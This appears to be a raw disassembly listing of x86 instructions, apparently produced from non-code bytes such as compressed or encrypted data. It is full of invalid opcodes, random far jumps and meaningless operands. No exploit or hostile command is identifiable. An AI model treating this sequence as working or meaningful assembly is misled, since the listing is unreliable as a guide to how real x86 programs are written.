  444c02:	xor    al,0xe4
  444c04:	jmp    0x65e1:0x40aace51
  444c0b:	out    0x20,eax
  444c0d:	mov    ebp,0x50f21254
  444c12:	mov    eax,0x538611d3
  444c17:	pop    ss
  444c18:	call   0x6667:0x811b8bc1
  444c1f:	jge    0x444c08
  444c21:	test   BYTE PTR [edx+edx*2],cl
  444c24:	loope  0x444bbb
  444c26:	sub    edx,DWORD PTR [ebp+0x196c355d]
  444c2c:	call   0x5907775f
  444c31:	ja     0x444c8a
  444c33:	leave  
  444c34:	daa    
  444c35:	jg     0x444ca6
  444c37:	sub    eax,0xaade9895
  444c3c:	sub    BYTE PTR [ebx+0x71],ah
  444c3f:	or     BYTE PTR [ecx+ebp*4],ah
  444c42:	inc    ecx
  444c43:	push   edx
  444c44:	mov    dl,0xfe
  444c46:	pop    ebp
  444c47:	push   ds
  444c48:	out    0xb2,al
  444c4a:	mov    dl,0xea
  444c4c:	mov    ecx,0xa0629820
  444c51:	sbb    al,0x3f
  444c53:	jg     0x444c99
  444c55:	jo     0x444c5b
  444c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444c58:	mov    ch,BYTE PTR [ebx]
  444c5a:	test   BYTE PTR [edx],dh
  444c5c:	pop    ecx
  444c5d:	xchg   ebp,eax
  444c5e:	push   ecx
  444c5f:	xchg   edi,eax
  444c60:	loopne 0x444c4a
  444c62:	je     0x444c7f
  444c64:	in     al,dx
  444c65:	cdq    
  444c66:	scas   eax,DWORD PTR es:[edi]
  444c67:	jbe    0x444c3c
  444c69:	test   al,0x60
  444c6b:	jge    0x444ca8
  444c6d:	aas    
  444c6e:	outs   dx,BYTE PTR ds:[esi]
  444c6f:	outs   dx,BYTE PTR ds:[esi]
  444c70:	jnp    0x444c72
  444c72:	mov    dl,bl
  444c74:	xchg   ebx,eax
  444c75:	dec    edx
  444c76:	sti    
  444c77:	retf   0x3c3c
  444c7a:	dec    ebx
  444c7b:	xlat   BYTE PTR ds:[ebx]
  444c7c:	(bad)  
  444c7d:	jmp    0x444c85
  444c7f:	fistp  QWORD PTR [ecx-0x50]
  444c82:	js     0x444c46
  444c84:	in     al,0xa
  444c86:	xchg   edx,eax
  444c87:	push   ebx
  444c88:	xor    DWORD PTR [ebx+0x29],ebp
  444c8b:	(bad)  
  444c8c:	mov    bl,0x72
  444c8e:	xchg   esp,eax
  444c8f:	adc    ecx,DWORD PTR es:[ebp+0x23]
  444c93:	iret   
  444c94:	or     DWORD PTR [ebx+ebp*8-0x2ab538a8],esi
  444c9b:	inc    edx
  444c9c:	xor    DWORD PTR [edi-0x4eda0f11],eax
  444ca2:	in     al,0xad
  444ca4:	mov    dl,0xfd
  444ca6:	(bad)  
  444ca7:	bound  edx,QWORD PTR [esi]
  444ca9:	xchg   BYTE PTR [ebp-0x2544327e],ah
  444caf:	popa   
  444cb0:	idiv   DWORD PTR [ebx]
  444cb2:	or     DWORD PTR [esi-0x16],edx
  444cb5:	cmc    
  444cb6:	retf   0x6f75
  444cb9:	je     0x444c48
  444cbb:	push   edx
  444cbc:	aam    0xe0
  444cbe:	test   eax,0xf2a6404f
  444cc3:	and    ch,bl
  444cc5:	jmp    0x45fa:0x8f6f7dd
  444ccc:	sub    eax,0x478b9074
  444cd1:	adc    al,0x38
  444cd3:	dec    esp
  444cd4:	or     bl,BYTE PTR [ebx+edx*2-0x2d]
  444cd8:	jo     0x444cae
  444cda:	xor    al,0x18
  444cdc:	fcmovb st,st(3)
  444cde:	popa   
  444cdf:	inc    esp
  444ce0:	imul   edi,DWORD PTR [esi-0x2afbd332],0x7
  444ce7:	sub    al,0xb8
  444ce9:	fisub  DWORD PTR [esp+ecx*1]
  444cec:	xchg   esp,eax
  444ced:	fsubr  QWORD PTR [ecx]
  444cef:	les    ebx,FWORD PTR [eax+0x6e]
  444cf2:	shr    DWORD PTR [edx+ebx*4-0x329a5cbe],1
  444cf9:	mov    ds:0xc88af06b,al
  444cfe:	adc    esp,DWORD PTR [edx+0x1fadadf3]
  444d04:	add    ecx,esi
  444d06:	es in  al,dx
  444d08:	aaa    
  444d09:	mov    al,ds:0x6afa35e2
  444d0e:	dec    eax
  444d0f:	dec    ebx
  444d10:	cld    
  444d11:	mov    ecx,0xe5852d44
  444d16:	ret    0x8bc9
  444d19:	and    BYTE PTR [esi-0x642436d9],0x42
  444d20:	dec    edx
  444d21:	mov    eax,0xf7d46adf
  444d26:	(bad)  
  444d27:	jbe    0x444d26
  444d29:	jbe    0x444d23
  444d2b:	push   ebx
  444d2c:	iret   
  444d2d:	push   ecx
  444d2e:	push   ecx
  444d2f:	mov    ds:0x27a17ff2,eax
  444d34:	mov    edi,0x3b61f4cb
  444d39:	mov    ds:0x575ee7c3,eax
  444d3e:	mov    edi,0x95c35491
  444d43:	jb     0x444d89
  444d45:	cmp    eax,0x92a59063
  444d4a:	in     eax,dx
  444d4b:	cld    
  444d4c:	mov    ds:0xb660f260,al
  444d51:	jg     0x444d33
  444d53:	xchg   BYTE PTR [ecx+0x19],al
  444d56:	jno    0x444d5b
  444d58:	jo     0x444dd9
  444d5a:	inc    ebp
  444d5b:	mov    ch,0x8a
  444d5d:	(bad)  
  444d5e:	xor    ch,BYTE PTR [edx+ecx*2-0x381f455c]
  444d65:	xchg   edx,eax
  444d66:	fmul   QWORD PTR [eax+0x7e3da453]
  444d6c:	sub    DWORD PTR [edx+0x37bc6538],ebx
  444d72:	xchg   BYTE PTR [edi],bh
  444d74:	pop    eax
  444d75:	icebp  
  444d76:	adc    cl,BYTE PTR [ebx-0x3debd551]
  444d7c:	mov    ah,0xfc
  444d7e:	jge    0x444d72
  444d80:	and    BYTE PTR [edx+edi*4],dh
  444d83:	lods   eax,DWORD PTR ds:[esi]
  444d84:	imul   eax,DWORD PTR [edx+0x23],0x2bb0215f
  444d8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444d8c:	pop    edi
  444d8d:	cmp    BYTE PTR [edx+0x10],ah
  444d90:	xchg   ebp,eax
  444d91:	ror    dh,0x67
  444d94:	(bad)  
  444d95:	or     DWORD PTR [ebp+0x3b],eax
  444d98:	mov    edi,0xc5567f7c
  444d9d:	xor    DWORD PTR [ecx+0x2edabe62],0x40
  444da4:	sbb    al,BYTE PTR [edi+0x733cd513]
  444daa:	nop
  444dab:	outs   dx,DWORD PTR ds:[esi]
  444dac:	int3   
  444dad:	inc    ebp
  444dae:	adc    edx,edi
  444db0:	call   0xc59ee828
  444db5:	or     eax,DWORD PTR [esi]
  444db7:	jp     0x444e00
  444db9:	addr16 push ss
  444dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444dbc:	add    cl,BYTE PTR [ebp+0xe2cff74]
  444dc2:	jmp    0xba60137f
  444dc7:	ds cmp eax,0x4713c536
  444dcd:	fld    TBYTE PTR [ebx+0x246fc66b]
  444dd3:	sub    cl,BYTE PTR [ebp+0x66]
  444dd6:	mov    ecx,0x7e8c7e
  444ddb:	call   FWORD PTR [ebp+0x67]
  444dde:	mov    edx,0xc0921c5d
  444de3:	xchg   DWORD PTR [ecx],esi
  444de5:	push   esp
  444de6:	jbe    0x444e3f
  444de8:	push   esi
  444de9:	rcr    DWORD PTR [ebx+0x6a],cl
  444dec:	das    
  444ded:	sub    BYTE PTR [ebx-0x5bb2b514],bh
  444df3:	repnz scas eax,DWORD PTR es:[edi]
  444df5:	adc    BYTE PTR [edx+0x1a],ch
  444df8:	pop    esi
  444df9:	mov    dl,0x14
  444dfb:	out    dx,eax
  444dfc:	out    dx,ax
  444dfe:	push   eax
  444dff:	add    edx,esi
  444e01:	lock (bad) 
  444e03:	pusha  
  444e04:	jne    0x444dc2
  444e06:	iret   
  444e07:	sub    al,0x84
  444e09:	fistp  DWORD PTR [ecx-0x4c]
  444e0c:	(bad)  
  444e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444e0e:	cmp    eax,0x747ee34a
  444e13:	mov    al,ds:0x1cb7e9de
  444e18:	fstp   DWORD PTR [ebp+edx*4-0x70]
  444e1c:	jno    0x444e3a
  444e1e:	mov    ds:0x2dc2c912,al
  444e23:	xchg   DWORD PTR [esi+0x41],esp
  444e26:	mov    ds:0x97c47de3,al
  444e2b:	out    0x5f,eax
  444e2d:	or     BYTE PTR ds:[ebx],ch
  444e30:	jg     0x444e15
  444e32:	les    ebp,FWORD PTR [ebp-0x9]
  444e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444e36:	repz imul ebx,DWORD PTR ds:0x62ff61eb,0xffffffe9
  444e3e:	mov    al,0x56
  444e40:	pop    eax
  444e41:	dec    esi
  444e42:	scas   al,BYTE PTR es:[edi]
  444e43:	stos   BYTE PTR es:[edi],al
  444e44:	adc    BYTE PTR [ecx+0x575493ec],bl
  444e4a:	push   ecx
  444e4b:	sbb    ebp,edi
  444e4d:	inc    ebx
  444e4e:	lock ds adc eax,0xb6a8b509
  444e55:	adc    ah,BYTE PTR [eax+esi*8-0xa35073a]
  444e5c:	stc    
  444e5d:	out    dx,al
  444e5e:	(bad)  
  444e5f:	aad    0x63
  444e61:	mov    WORD PTR [ebp-0xa870352],fs
  444e67:	cmp    eax,0x4cca9bc4
  444e6c:	ins    DWORD PTR es:[edi],dx
  444e6d:	jp     0x444ec5
  444e6f:	mov    dl,0x94
  444e71:	inc    edi
  444e72:	dec    eax
  444e73:	cmp    eax,0xede53b63
  444e78:	cld    
  444e79:	pusha  
  444e7a:	xor    esi,DWORD PTR [ebx-0x2ebc54f3]
  444e80:	sbb    eax,0xd23dd7b7
  444e85:	les    ebp,FWORD PTR [edx]
  444e87:	jbe    0x4c985cbb
  444e8d:	mov    ch,0x1
  444e8f:	fcmovb st,st(1)
  444e91:	xchg   ebx,eax
  444e92:	lods   al,BYTE PTR ds:[esi]
  444e93:	xor    DWORD PTR [edi+0x64248244],eax
  444e99:	push   ebx
  444e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444e9b:	pop    es
  444e9c:	shl    BYTE PTR [ebp+0x1d],0xe1
  444ea0:	ins    DWORD PTR es:[edi],dx
  444ea1:	jp     0x444ed3
  444ea3:	aad    0x1c
  444ea5:	cld    
  444ea6:	sub    ah,dl
  444ea8:	push   esp
  444ea9:	ss pop eax
  444eab:	jo     0x444f07
  444ead:	sbb    eax,0x14e3c67b
  444eb2:	sub    edx,DWORD PTR [eax-0x2786c17]
  444eb8:	repz jns 0x444f0b
  444ebb:	repz pop ebp
  444ebd:	mov    eax,0x9edf2e4b
  444ec2:	or     al,0x35
  444ec4:	ror    eax,1
  444ec6:	sub    edx,DWORD PTR [eax]
  444ec8:	or     eax,0xa918a076
  444ecd:	xlat   BYTE PTR ds:[ebx]
  444ece:	ror    BYTE PTR [ecx-0x72],1
  444ed1:	loopne 0x444f3d
  444ed3:	sub    esp,DWORD PTR [edx]
  444ed5:	test   BYTE PTR [edi+eax*8+0x6686cb88],ch
  444edc:	push   esp
  444edd:	adc    edi,DWORD PTR [esi-0x5b3c0e9c]
  444ee3:	ins    DWORD PTR es:[edi],dx
  444ee4:	adc    eax,0xc424f09d
  444ee9:	mov    esi,0x236cf736
  444eee:	bound  ecx,QWORD PTR [ebp+eiz*2+0x59]
  444ef2:	lock pop ds
  444ef4:	xlat   BYTE PTR ds:[ebx]
  444ef5:	mov    al,0x6f
  444ef7:	sbb    BYTE PTR [edx-0x28],dh
  444efa:	(bad)  
  444efb:	(bad)  
  444efd:	push   0xb6b633f4
  444f02:	lea    ecx,[eax]
  444f04:	xor    dh,dh
  444f06:	aaa    
  444f07:	inc    eax
  444f08:	add    eax,0x603abb5b
  444f0d:	mov    eax,ds:0x762f00fa
  444f12:	sbb    DWORD PTR [edx-0x293d0fd7],ecx
  444f18:	fdiv   st,st(2)
  444f1a:	jecxz  0x444ec8
  444f1c:	jno    0x444ec1
  444f1e:	fstp   QWORD PTR cs:[eax+edi*4]
  444f22:	stc    
  444f23:	mov    ebx,0x3dae9055
  444f28:	jmp    0xdd6f:0x999f9a7f
  444f2f:	dec    eax
  444f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444f31:	in     eax,dx
  444f32:	mov    dl,0xf6
  444f34:	rol    bl,1
  444f36:	daa    
  444f37:	jbe    0x444f49
  444f39:	pushf  
  444f3a:	imul   ebx,DWORD PTR [eax+0x25],0xffffffeb
  444f3e:	mov    ebp,0x4284e32e
  444f43:	xchg   edx,eax
  444f44:	mov    ?,WORD PTR [edx-0x1daf81f2]
  444f4a:	fstp   DWORD PTR [ecx-0x7a]
  444f4d:	sub    ebx,DWORD PTR [ecx-0x7404338b]
  444f53:	aam    0xf0
  444f55:	stos   BYTE PTR es:[edi],al
  444f56:	jmp    0x444f47
  444f58:	push   cs
  444f59:	adc    al,0x31
  444f5b:	sub    DWORD PTR [ecx+ebx*2-0x44],0x80850afe
  444f63:	dec    edi
  444f64:	icebp  
  444f65:	push   eax
  444f66:	in     al,dx
  444f67:	ss test eax,0x70d68476
  444f6d:	cdq    
  444f6e:	push   ss
  444f6f:	pop    eax
  444f70:	test   eax,0x4efd37
  444f75:	lea    edi,[ebp-0x64]
  444f78:	out    0x89,eax
  444f7a:	sbb    al,al
  444f7c:	call   0x7fae:0x7a88ecdc
  444f83:	mov    ds:0x55e70aa2,al
  444f88:	mov    cl,0x4a
  444f8a:	popf   
  444f8b:	mov    edx,DWORD PTR [ebx-0x52bbd01d]
  444f91:	sub    BYTE PTR [ebx],dl
  444f93:	sub    ebp,eax
  444f95:	dec    edx
  444f96:	mov    ah,0xc3
  444f98:	test   al,0x59
  444f9a:	in     eax,dx
  444f9b:	mov    eax,ds
  444f9d:	push   ecx
  444f9e:	push   0x79be7f34
  444fa3:	fs in  eax,0xbf
  444fa6:	cli    
  444fa7:	xchg   ebx,eax
  444fa8:	cmp    eax,0xfddfe79c
  444fad:	xchg   edx,eax
  444fae:	inc    esp
  444faf:	jae    0x444f83
  444fb1:	jmp    0x444fe3
  444fb3:	out    0x33,al
  444fb5:	mov    ebp,0xd6c36d40
  444fba:	or     ebp,DWORD PTR [edx+edx*4-0x53]
  444fbe:	(bad)  
  444fbf:	push   0xc
  444fc1:	stos   DWORD PTR es:[edi],eax
  444fc2:	xchg   esi,eax
  444fc3:	movd   mm1,DWORD PTR [esi]
  444fc6:	popa   
  444fc7:	test   BYTE PTR [bx+di-0x7],ch
  444fcb:	int    0x8
  444fcd:	out    dx,eax
  444fce:	lock ins BYTE PTR es:[edi],dx
  444fd0:	in     eax,dx
  444fd1:	rcr    DWORD PTR [eax+edi*8-0x1e],1
  444fd5:	nop
  444fd6:	adc    BYTE PTR [eax+0x55b6bceb],0x8c
  444fdd:	sub    dh,BYTE PTR [edi]
  444fdf:	adc    ah,cl
  444fe1:	jae    0x445035
  444fe3:	sbb    ebp,0xa833b84f
  444fe9:	rcr    eax,1
  444feb:	push   edi
  444fec:	iret   
  444fed:	pusha  
  444fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444fef:	jmp    0x57ce:0xa8da6f43
  444ff6:	mov    ebx,0x43a09bb
  444ffb:	(bad)  
  444ffc:	in     eax,dx
  444ffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444ffe:	or     al,0x64
  445000:	inc    eax
  445001:	fld    TBYTE PTR [edi]
  445003:	scas   eax,DWORD PTR es:[edi]
  445004:	stos   BYTE PTR es:[edi],al
  445005:	or     DWORD PTR [esi-0x61902c75],esp
  44500b:	loopne 0x444fe3
  44500d:	push   es
  44500e:	(bad)  
  44500f:	push   0xc8d38806
  445014:	loope  0x444fa0
  445016:	ins    BYTE PTR es:[edi],dx
  445017:	mov    al,ds:0x95d7e2a0
  44501c:	jb     0x445077
  44501e:	push   cs
  44501f:	bound  ebx,QWORD PTR ds:0x7183882d
  445025:	jo     0x445081
  445027:	xchg   ecx,eax
  445028:	(bad)  
  445029:	sub    bh,BYTE PTR [ecx]
  44502b:	cwde   
  44502c:	sbb    BYTE PTR [ebx],dl
  44502e:	popf   
  44502f:	mov    ah,0x7e
  445031:	adc    al,0xc2
  445033:	in     al,0x4d
  445035:	cdq    
  445036:	arpl   WORD PTR [ebx],si
  445038:	lods   eax,DWORD PTR ds:[esi]
  445039:	jb     0x445024
  44503b:	stc    
  44503c:	mov    eax,0x1cd15c92
  445041:	lds    ebp,FWORD PTR [esi]
  445043:	xchg   esi,eax
  445044:	sbb    edx,0xffffffb9
  445047:	xor    eax,0xdfb75f78
  44504c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44504d:	bnd jo 0x4450b6
  445050:	and    dl,BYTE PTR [esi]
  445052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445053:	adc    eax,0xa986a381
  445058:	pop    edi
  445059:	jl     0x445047
  44505b:	(bad)  
  44505c:	cs popa 
  44505e:	shl    DWORD PTR [edx+edx*2-0x19],1
  445062:	addr16 es ja 0x44504b
  445066:	(bad)  
  445068:	cmp    al,0x4b
  44506a:	mov    al,ds:0x440ebcd8
  44506f:	cwde   
  445070:	pop    esp
  445071:	jb     0x445063
  445073:	push   es
  445074:	scas   al,BYTE PTR es:[edi]
  445075:	fwait
  445076:	cmp    eax,0x50083958
  44507b:	pusha  
  44507c:	jo     0x4450b9
  44507e:	shl    BYTE PTR [esi+0x78a257d8],1
  445084:	addr16 test eax,0xf92e8953
  44508a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44508b:	call   0xba353da7
  445090:	ror    DWORD PTR [esi],0xc
  445093:	push   edx
  445094:	adc    DWORD PTR [edx-0x16],ebp
  445097:	push   es
  445098:	loop   0x445060
  44509a:	mov    dh,BYTE PTR [ecx-0x21]
  44509d:	xchg   esi,eax
  44509e:	shl    BYTE PTR [eax+0x1d],1
  4450a1:	sub    BYTE PTR [eax+edx*2-0x4201695f],ch
  4450a8:	push   ebx
  4450a9:	fst    DWORD PTR [ebx+0x12]
  4450ac:	ja     0x4450e6
  4450ae:	jo     0x44511f
  4450b0:	pushf  
  4450b1:	(bad)  
  4450b2:	adc    eax,0xb204bb60
  4450b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4450b8:	mov    dl,0xa9
  4450ba:	sbb    al,0x82
  4450bc:	ds (bad) 
  4450bf:	out    0x5a,al
  4450c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4450c2:	dec    esp
  4450c3:	imul   edx,ebp,0xe64da60e
  4450c9:	stc    
  4450ca:	lds    eax,FWORD PTR [eax]
  4450cc:	out    0x47,eax
  4450ce:	outs   dx,DWORD PTR ds:[esi]
  4450cf:	(bad)  
  4450d0:	ds arpl di,di
  4450d3:	jne    0x445077
  4450d5:	nop
  4450d6:	xchg   DWORD PTR [ecx+0x35],eax
  4450d9:	lods   eax,DWORD PTR ds:[esi]
  4450da:	test   DWORD PTR [ebx+0x60f20d28],0x45b2f284
  4450e4:	push   eax
  4450e5:	xchg   edi,eax
  4450e6:	je     0x445110
  4450e8:	test   BYTE PTR [eax-0x34deccc],ch
  4450ee:	push   esp
  4450ef:	cmp    esi,DWORD PTR [eax+0x618ab3ad]
  4450f5:	clc    
  4450f6:	dec    edi
  4450f7:	adc    bh,BYTE PTR [ebx-0x25]
  4450fa:	and    ecx,DWORD PTR [ecx]
  4450fc:	int    0xe9
  4450fe:	ror    DWORD PTR [ecx],1
  445100:	mov    bl,0x8b
  445102:	and    DWORD PTR [edi-0x42],ecx
  445105:	adc    eax,0xc7a409de
  44510a:	or     BYTE PTR [ebp+0x8247ee0],al
  445110:	jmp    0x3af8:0x82f74f60
  445117:	sub    esi,esi
  445119:	idiv   BYTE PTR [ecx]
  44511b:	xor    eax,0x655dfcb
  445120:	popa   
  445121:	mov    cl,0x7
  445123:	lea    esi,[esi-0x11]
  445126:	aam    0xd8
  445128:	sbb    al,0x36
  44512a:	inc    ebx
  44512b:	mov    ds:0xfca1528b,al
  445130:	arpl   WORD PTR [eax-0x39],bx
  445133:	sti    
  445134:	xor    dl,BYTE PTR [edx+eax*1]
  445137:	imul   esi,DWORD PTR [esi-0x4b],0xe5adbe0e
  44513e:	mov    cl,0xa1
  445140:	pop    edi
  445141:	pop    esi
  445142:	aaa    
  445143:	push   cs
  445144:	fisub  WORD PTR [ebp-0x47c6c027]
  44514a:	dec    ecx
  44514b:	adc    edx,DWORD PTR [ebx]
  44514d:	adc    ecx,DWORD PTR [edx+0x30]
  445150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445151:	push   edx
  445152:	jp     0x44511d
  445154:	add    al,0x98
  445156:	fst    QWORD PTR [ebx-0x4e]
  445159:	cmp    al,0x34
  44515b:	push   ebx
  44515c:	mov    edx,0x63002cca
  445161:	test   al,0xf4
  445163:	mov    cs,WORD PTR [edi]
  445165:	idiv   BYTE PTR [edi]
  445167:	out    0xe0,al
  445169:	mov    edi,?
  44516b:	mov    edx,0x124a415e
  445170:	test   eax,0x6db6e1ed
  445175:	(bad)  
  445176:	arpl   WORD PTR [ecx+0x6c],ax
  445179:	push   edi
  44517a:	pop    edi
  44517b:	mov    esp,0x5ccff82a
  445180:	jns    0x4451e4
  445182:	loop   0x4451b6
  445184:	and    al,0x1d
  445186:	ret    0xfe20
  445189:	push   ss
  44518a:	imul   edx,eax,0x4d4002a7
  445190:	and    eax,0xc9e517c
  445195:	mov    edi,0xc00fa1d1
  44519a:	scas   eax,DWORD PTR es:[edi]
  44519b:	jle    0x4451b5
  44519d:	push   ecx
  44519e:	push   ss
  44519f:	xchg   ecx,eax
  4451a0:	mov    ah,0xc
  4451a2:	rcl    DWORD PTR [ecx],cl
  4451a4:	std    
  4451a5:	sbb    al,0x4b
  4451a7:	out    0xa4,al
  4451a9:	in     eax,dx
  4451aa:	pop    ebp
  4451ab:	loope  0x44516c
  4451ad:	jle    0x44522b
  4451af:	ret    0x111a
  4451b2:	add    esp,ebx
  4451b4:	(bad)  
  4451b5:	sbb    DWORD PTR [edx],edx
  4451b7:	icebp  
  4451b8:	jmp    0x851d:0xe90ec92b
  4451bf:	xlat   BYTE PTR ds:[ebx]
  4451c0:	(bad)  
  4451c1:	mov    eax,0xd54ba3ad
  4451c6:	cmp    edx,DWORD PTR [ebx]
  4451c8:	les    esp,FWORD PTR [ebx-0x1c9a6bb]
  4451ce:	test   BYTE PTR [ebp-0x1a8ba7c8],bl
  4451d4:	ror    DWORD PTR [eax],cl
  4451d6:	lahf   
  4451d7:	pusha  
  4451d8:	in     al,dx
  4451d9:	push   es
  4451da:	push   ecx
  4451db:	add    dl,BYTE PTR [edi]
  4451dd:	push   ds
  4451de:	mov    ch,0x61
  4451e0:	add    BYTE PTR [ecx],bl
  4451e2:	(bad)  
  4451e3:	push   0xffffffb5
  4451e5:	push   edi
  4451e6:	mov    ch,0xbd
  4451e8:	mov    ebp,0x345c631
  4451ed:	add    bl,dl
  4451ef:	pop    ecx
  4451f0:	ss mov ah,0x7d
  4451f3:	shl    DWORD PTR [eax-0x4bcfba1],cl
  4451f9:	inc    BYTE PTR [ebx-0x1f61a59b]
  4451ff:	mov    ah,0xf6
  445201:	xor    DWORD PTR [eax],0x34
  445204:	or     dl,BYTE PTR [eax+ebx*1-0x10866eac]
  44520b:	mov    WORD PTR [eax+0x33],ss
  44520e:	mov    al,0xed
  445210:	mov    bh,0x8e
  445212:	pop    eax
  445213:	aas    
  445214:	aad    0x7e
  445216:	push   ss
  445217:	cmp    DWORD PTR [ebx],0xcf3dea87
  44521d:	pop    eax
  44521e:	je     0x4451f3
  445220:	fisttp QWORD PTR [ebx-0x63eeb6a5]
  445226:	jecxz  0x4451be
  445228:	jno    0x445279
  44522a:	pop    es
  44522b:	push   es
  44522c:	aas    
  44522d:	fcomp  QWORD PTR [ecx+ebp*4+0x6193f839]
  445234:	into   
  445235:	retf   
  445236:	or     BYTE PTR [esi],bl
  445238:	stos   DWORD PTR es:[edi],eax
  445239:	dec    esi
  44523a:	mov    esi,ebp
  44523c:	push   esi
  44523d:	adc    al,0xd6
  44523f:	mov    bh,0x5a
  445241:	inc    edi
  445242:	popf   
  445243:	jne    0x445274
  445245:	lock push ebx
  445247:	outs   dx,BYTE PTR ds:[esi]
  445248:	xchg   ebp,eax
  445249:	adc    al,0x3b
  44524b:	arpl   WORD PTR [eax],dx
  44524d:	xor    al,0x49
  44524f:	mov    ah,0xcc
  445251:	adc    al,0x6
  445253:	xor    eax,0x587214ac
  445258:	and    dh,BYTE PTR [ebp-0x39accb13]
  44525e:	dec    esp
  44525f:	push   esi
  445260:	mul    DWORD PTR [eax+0x17]
  445263:	mov    ds:0xf1584f9a,al
  445268:	mov    BYTE PTR [esi+0x69d53b50],dl
  44526e:	adc    ch,BYTE PTR [ebx]
  445270:	pmaddwd mm5,QWORD PTR [ecx+0x22]
  445274:	xchg   ebx,eax
  445275:	pop    ds
  445276:	pushf  
  445277:	clc    
  445278:	jmp    0x445221
  44527a:	cmp    ch,dh
  44527c:	pop    eax
  44527d:	cmp    DWORD PTR [eax-0x125ba00f],0xd2cd947b
  445287:	cs inc esi
  445289:	sar    dh,cl
  44528b:	dec    esp
  44528c:	jmp    0x44527f
  44528e:	cmp    al,0x19
  445290:	mov    ah,0x12
  445292:	jg     0x44526e
  445294:	retf   0x5526
  445297:	jnp    0x445287
  445299:	push   eax
  44529a:	ds int3 
  44529c:	or     BYTE PTR [ebx],bh
  44529e:	fst    DWORD PTR [ebx]
  4452a0:	inc    esp
  4452a1:	ins    DWORD PTR es:[edi],dx
  4452a2:	jecxz  0x4452dc
  4452a4:	inc    edi
  4452a5:	add    edx,DWORD PTR [eax]
  4452a7:	leave  
  4452a8:	add    al,0xe
  4452aa:	shl    BYTE PTR [edi+edx*2+0x20793704],1
  4452b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4452b2:	xchg   esp,eax
  4452b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4452b4:	add    ebx,eax
  4452b6:	mov    bl,0x9f
  4452b8:	mov    bh,0x67
  4452ba:	call   0x3ce5:0x3c40f6bc
  4452c1:	test   eax,0x29846ddd
  4452c6:	add    eax,0xb98ba4d7
  4452cb:	push   cs
  4452cc:	cld    
  4452cd:	xchg   ebp,eax
  4452ce:	imul   ecx,DWORD PTR [esi+ebp*2+0x4e43657d],0xffffffd5
  4452d6:	js     0x445283
  4452d8:	leave  
  4452d9:	leave  
  4452da:	jno    0x445331
  4452dc:	dec    edi
  4452dd:	std    
  4452de:	out    0x3d,eax
  4452e0:	dec    esi
  4452e1:	push   ecx
  4452e2:	push   ds
  4452e3:	add    DWORD PTR [esi-0x6661e1f],0x4e
  4452ea:	mov    edi,0xa7276586
  4452ef:	out    0xb0,eax
  4452f1:	xchg   ebp,eax
  4452f2:	clc    
  4452f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4452f4:	mov    esi,0x5b516c89
  4452f9:	mov    BYTE PTR [ecx-0x7481d10b],dh
  4452ff:	mov    dh,0x53
  445301:	mov    ?,WORD PTR [ecx-0x58]
  445304:	push   ds
  445305:	xchg   ebp,eax
  445306:	jb     0x445310
  445308:	dec    ebx
  445309:	rcl    BYTE PTR [esi+0x2c],1
  44530c:	jb     0x4452c3
  44530e:	lods   ax,WORD PTR ds:[esi]
  445310:	fistp  WORD PTR [eax+0x6f]
  445313:	arpl   WORD PTR [ecx-0x34],dx
  445316:	xor    al,0x40
  445318:	push   cs
  445319:	xchg   ch,dh
  44531b:	enter  0x404e,0x12
  44531f:	add    DWORD PTR [edx],0xffffffc9
  445322:	ret    
  445323:	mov    edi,0x43cbcfb4
  445328:	jnp    0x445333
  44532a:	pop    edi
  44532b:	cmc    
  44532c:	mov    al,ds:0x72bcadbd
  445331:	xchg   ebp,eax
  445332:	push   ebp
  445333:	call   FWORD PTR [edi]
  445335:	cmp    esp,esi
  445337:	sbb    edx,ebp
  445339:	fiadd  WORD PTR [esi+edi*8-0x62]
  44533d:	inc    ebx
  44533e:	aas    
  44533f:	push   eax
  445340:	nop
  445341:	ins    DWORD PTR es:[edi],dx
  445342:	push   esp
  445343:	test   al,0x10
  445345:	mov    edx,0x2934932e
  44534a:	ret    0x2f55
  44534d:	push   edi
  44534e:	cmp    BYTE PTR [edi],0x7e
  445351:	xor    DWORD PTR [edx],ebx
  445353:	jno    0x445314
  445355:	sbb    DWORD PTR [esi-0x7d07fd19],ecx
  44535b:	mov    cl,0x5d
  44535d:	pop    ebx
  44535e:	ror    WORD PTR [edx+0x65b7fa9d],0x26
  445366:	xchg   esp,eax
  445367:	enter  0x1417,0xdc
  44536b:	dec    edi
  44536c:	jno    0x4453b2
  44536e:	cld    
  44536f:	cmp    BYTE PTR [ecx-0x5d2d0d6d],0xa5
  445376:	add    bh,BYTE PTR ds:0xf5d96971
  44537c:	xor    BYTE PTR [ebx+eax*2+0x92ed174],cl
  445383:	inc    eax
  445384:	cmc    
  445385:	push   ebp
  445386:	aaa    
  445387:	loopne 0x445350
  445389:	pop    edi
  44538a:	les    ecx,FWORD PTR [edi]
  44538c:	jmp    0x44535e
  44538e:	ins    BYTE PTR es:[edi],dx
  44538f:	jo     0x4453d4
  445391:	int3   
  445392:	inc    edi
  445393:	scas   al,BYTE PTR es:[edi]
  445394:	xchg   ebx,eax
  445395:	jb     0x4453eb
  445397:	inc    edi
  445398:	shl    DWORD PTR [ebp-0x5b4ec77f],cl
  44539e:	not    BYTE PTR [edx+0x1b]
  4453a1:	and    ch,dh
  4453a3:	jns    0x445350
  4453a5:	fisubr DWORD PTR [edi+0x36fc3c62]
  4453ab:	or     DWORD PTR [edi+ecx*2],edx
  4453ae:	jl     0x445428
  4453b0:	cmp    cl,BYTE PTR [edx+edi*8]
